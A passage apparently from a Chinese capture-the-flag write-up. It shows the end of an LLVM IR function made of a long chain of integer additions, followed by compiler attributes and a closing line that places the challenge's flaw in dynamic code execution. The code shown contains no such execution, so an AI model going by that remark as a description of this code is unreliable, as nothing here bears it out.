  %140 = add nsw i64 %139, 256
  %141 = add nsw i64 %140, 256
  %142 = add nsw i64 %141, 256
  %143 = add nsw i64 %142, 256
  %144 = add nsw i64 %143, 256
  %145 = add nsw i64 %144, 256
  %146 = add nsw i64 %145, 256
  %147 = add nsw i64 %146, 256
  %148 = add nsw i64 %147, 256
  %149 = add nsw i64 %148, 256
  %150 = add nsw i64 %149, 256
  %151 = add nsw i64 %150, 256
  %152 = add nsw i64 %151, 256
  %153 = add nsw i64 %152, 256
  %154 = add nsw i64 %153, 256
  %155 = add nsw i64 %154, 256
  %156 = add nsw i64 %155, 256
  %157 = add nsw i64 %156, 256
  %158 = add nsw i64 %157, 256
  %159 = add nsw i64 %158, 256
  %160 = add nsw i64 %159, 256
  %161 = add nsw i64 %160, 256
  %162 = add nsw i64 %161, 256
  %163 = add nsw i64 %162, 256
  %164 = add nsw i64 %163, 256
  %165 = add nsw i64 %164, 256
  %166 = add nsw i64 %165, 256
  %167 = add nsw i64 %166, 256
  %168 = add nsw i64 %167, 256
  %169 = add nsw i64 %168, 256
  %170 = add nsw i64 %169, 256
  %171 = add nsw i64 %170, 256
  %172 = add nsw i64 %171, 256
  %173 = add nsw i64 %172, 256
  %174 = add nsw i64 %173, 256
  %175 = add nsw i64 %174, 256
  %176 = add nsw i64 %175, 256
  %177 = add nsw i64 %176, 256
  %178 = add nsw i64 %177, 256
  %179 = add nsw i64 %178, 256
  %180 = add nsw i64 %179, 256
  %181 = add nsw i64 %180, 256
  %182 = add nsw i64 %181, 256
  %183 = add nsw i64 %182, 256
  %184 = add nsw i64 %183, 256
  %185 = add nsw i64 %184, 256
  %186 = add nsw i64 %185, 256
  %187 = add nsw i64 %186, 256
  %188 = add nsw i64 %187, 256
  %189 = add nsw i64 %188, 256
  %190 = add nsw i64 %189, 256
  %191 = add nsw i64 %190, 256
  %192 = add nsw i64 %191, 256
  %193 = add nsw i64 %192, 256
  %194 = add nsw i64 %193, 256
  %195 = add nsw i64 %194, 256
  %196 = add nsw i64 %195, 256
  %197 = add nsw i64 %196, 256
  %198 = add nsw i64 %197, 256
  %199 = add nsw i64 %198, 256
  %200 = add nsw i64 %199, 256
  %201 = add nsw i64 %200, 256
  %202 = add nsw i64 %201, 256
  %203 = add nsw i64 %202, 256
  %204 = add nsw i64 %203, 256
  %205 = add nsw i64 %204, 256
  %206 = add nsw i64 %205, 256
  %207 = add nsw i64 %206, 256
  %208 = add nsw i64 %207, 256
  %209 = add nsw i64 %208, 256
  %210 = add nsw i64 %209, 256
  %211 = add nsw i64 %210, 256
  %212 = add nsw i64 %211, 256
  %213 = add nsw i64 %212, 256
  %214 = add nsw i64 %213, 256
  %215 = add nsw i64 %214, 256
  %216 = add nsw i64 %215, 256
  %217 = add nsw i64 %216, 256
  %218 = add nsw i64 %217, 256
  %219 = add nsw i64 %218, 256
  %220 = add nsw i64 %219, 256
  %221 = add nsw i64 %220, 256
  %222 = add nsw i64 %221, 256
  %223 = add nsw i64 %222, 256
  %224 = add nsw i64 %223, 256
  %225 = add nsw i64 %224, 256
  %226 = add nsw i64 %225, 256
  %227 = add nsw i64 %226, 256
  %228 = add nsw i64 %227, 256
  %229 = add nsw i64 %228, 256
  %230 = add nsw i64 %229, 256
  %231 = add nsw i64 %230, 256
  %232 = add nsw i64 %231, 256
  %233 = add nsw i64 %232, 256
  %234 = add nsw i64 %233, 256
  %235 = add nsw i64 %234, 256
  %236 = add nsw i64 %235, 256
  %237 = add nsw i64 %236, 256
  %238 = add nsw i64 %237, 256
  %239 = add nsw i64 %238, 256
  %240 = add nsw i64 %239, 256
  %241 = add nsw i64 %240, 256
  %242 = add nsw i64 %241, 256
  %243 = add nsw i64 %242, 256
  %244 = add nsw i64 %243, 256
  %245 = add nsw i64 %244, 256
  %246 = add nsw i64 %245, 256
  %247 = add nsw i64 %246, 256
  %248 = add nsw i64 %247, 256
  %249 = add nsw i64 %248, 256
  %250 = add nsw i64 %249, 256
  %251 = add nsw i64 %250, 256
  %252 = add nsw i64 %251, 256
  %253 = add nsw i64 %252, 256
  %254 = add nsw i64 %253, 256
  %255 = add nsw i64 %254, 256
  %256 = add nsw i64 %255, 256
  %257 = add nsw i64 %256, 256
  %258 = add nsw i64 %257, 256
  %259 = add nsw i64 %258, 256
  %260 = add nsw i64 %259, 256
  %261 = add nsw i64 %260, 256
  %262 = add nsw i64 %261, 256
  %263 = add nsw i64 %262, 256
  %264 = add nsw i64 %263, 256
  %265 = add nsw i64 %264, 256
  %266 = add nsw i64 %265, 256
  %267 = add nsw i64 %266, 256
  %268 = add nsw i64 %267, 256
  %269 = add nsw i64 %268, 256
  %270 = add nsw i64 %269, 256
  %271 = add nsw i64 %270, 256
  %272 = add nsw i64 %271, 256
  %273 = add nsw i64 %272, 256
  %274 = add nsw i64 %273, 256
  %275 = add nsw i64 %274, 256
  %276 = add nsw i64 %275, 256
  %277 = add nsw i64 %276, 256
  %278 = add nsw i64 %277, 256
  %279 = add nsw i64 %278, 256
  %280 = add nsw i64 %279, 256
  %281 = add nsw i64 %280, 256
  %282 = add nsw i64 %281, 256
  %283 = add nsw i64 %282, 256
  %284 = add nsw i64 %283, 256
  %285 = add nsw i64 %284, 256
  %286 = add nsw i64 %285, 256
  %287 = add nsw i64 %286, 256
  %288 = add nsw i64 %287, 256
  %289 = add nsw i64 %288, 256
  %290 = add nsw i64 %289, 256
  %291 = add nsw i64 %290, 256
  %292 = add nsw i64 %291, 256
  %293 = add nsw i64 %292, 256
  %294 = add nsw i64 %293, 256
  %295 = add nsw i64 %294, 256
  %296 = add nsw i64 %295, 256
  %297 = add nsw i64 %296, 256
  %298 = add nsw i64 %297, 256
  %299 = add nsw i64 %298, 256
  %300 = add nsw i64 %299, 256
  %301 = add nsw i64 %300, 256
  %302 = add nsw i64 %301, 256
  %303 = add nsw i64 %302, 256
  %304 = add nsw i64 %303, 256
  %305 = add nsw i64 %304, 256
  %306 = add nsw i64 %305, 256
  %307 = add nsw i64 %306, 256
  %308 = add nsw i64 %307, 256
  %309 = add nsw i64 %308, 256
  %310 = add nsw i64 %309, 256
  %311 = add nsw i64 %310, 256
  %312 = add nsw i64 %311, 256
  %313 = add nsw i64 %312, 256
  %314 = add nsw i64 %313, 1
  %315 = add nsw i64 %314, 1
  %316 = add nsw i64 %315, 1
  %317 = add nsw i64 %316, 256
  %318 = add nsw i64 %317, 256
  %319 = add nsw i64 %318, 256
  ret i64 %319
}

attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}
```

本题的漏洞点在于代码执行。在做题的时候，要特别注意动态代码执行部分，这个部分往往就是漏洞产生的地方。
